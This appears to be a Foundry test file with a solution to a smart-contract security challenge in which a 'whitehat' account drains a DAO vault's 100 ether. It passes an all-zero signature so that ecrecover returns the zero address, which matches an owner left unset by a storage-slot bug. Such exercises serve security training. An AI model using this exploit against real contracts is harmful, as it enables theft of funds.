// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {DaoVaultImplementation, FactoryDao, IDaoVault} from "../src/7_crystalDAO/crystalDAO.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/

/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge7Test is Test {
    FactoryDao factory;

    address public whitehat = makeAddr("whitehat");
    address public daoManager;
    uint256 daoManagerKey;

    IDaoVault vault;

    function setUp() public {
        (daoManager, daoManagerKey) = makeAddrAndKey("daoManager");
        factory = new FactoryDao();

        vm.prank(daoManager);
        vault = IDaoVault(factory.newWallet());

        // The vault has reached 100 ether in donations
        deal(address(vault), 100 ether);
    }

    function testHack() public {
        vm.startPrank(whitehat, whitehat);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge7Test -vvvv //
        ////////////////////////////////////////////////////*/
        bytes32 domainSeparator = vault.getDomainSeparator();
        bytes32 structHash = keccak256(
            abi.encode(
                keccak256("Exec(address target,uint256 value,bytes memory execOrder,uint256 nonce,uint256 deadline)"),
                whitehat,
                address(vault).balance,
                "",
                0,
                type(uint256).max
            )
        );
        bytes32 hash;
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, "\x19\x01")
            mstore(add(ptr, 0x02), domainSeparator)
            mstore(add(ptr, 0x22), structHash)
            hash := keccak256(ptr, 0x42)
        }
        // (uint8 v, bytes32 r, bytes32 s) = vm.sign(daoManagerKey, hash);
        // the above line doesn't work because in the initialize function owner is written in the wrong storage slot
        // owner is 0x0 so we force ecrecover to return 0x0 passing an invalid signature
        vault.execWithSignature(0, 0x0, 0x0, daoManager, address(vault).balance, "", type(uint256).max);

        //==================================================//
        vm.stopPrank();

        assertEq(daoManager.balance, 100 ether, "The Dao manager's balance should be 100 ether");
    }

    function toTypedDataHash(bytes32 domainSeparator, bytes32 structHash) internal pure returns (bytes32 data) {
        /// @solidity memory-safe-assembly
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, "\x19\x01")
            mstore(add(ptr, 0x02), domainSeparator)
            mstore(add(ptr, 0x22), structHash)
            data := keccak256(ptr, 0x42)
        }
    }
}
